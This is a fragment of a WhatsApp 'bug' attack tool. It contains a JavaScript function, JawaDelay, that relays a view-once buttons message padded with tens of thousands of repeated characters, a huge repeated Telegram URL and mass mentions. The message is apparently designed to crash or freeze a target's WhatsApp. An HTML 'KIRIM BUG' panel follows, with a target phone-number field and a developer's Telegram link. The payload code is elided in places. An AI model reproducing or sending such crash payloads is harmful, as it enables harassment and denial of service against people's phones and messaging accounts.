...
async function JawaDelay(sock, target) {
  await sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: "𐎟 Hii Kyzuu 𐎟" + "ꦽ".repeat(70000),
            contentText: "𐎟 1801 𐎟" + "ꦽ".repeat(70000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
              ...
              externalAdReply: {
                ...
                sourceUrl: `https://t.me/${"عليكم".repeat(2000)}Kyzuu`,
              },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  {
                    originalUrl: "https://t.me/Kyzuu404",
                    unconsentedUsersUrl: "https://t.me/Kyzuu403",
                    consentedUsersUrl: "https://t.me/Kyzuu404",
                    cardIndex: 1,
                  },
                  {
                    originalUrl: "https://t.me/Kyzuu404",
                    unconsentedUsersUrl: "https://t.me/Kyzuu403",
                    consentedUsersUrl: "https://t.me/Kyzuu403",
                    cardIndex: 2,
                  },
                ],
              },
...
<body>
  <div class="card">
    <img src="https://c.top4top.io/p_3538dhw1s1.jpg" class="logo" alt="Logo">
    <div class="title">KIRIM BUG</div>
    <div class="subtitle">Choose mode & target number</div>

    <input type="text" placeholder="62xxxxxxxxxx" />
    ...
    <div class="footer-action-container">
      <div class="footer-button">
        <a href="https://t.me/RannTzyBack2" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
      </div>
      <div class="footer-button">
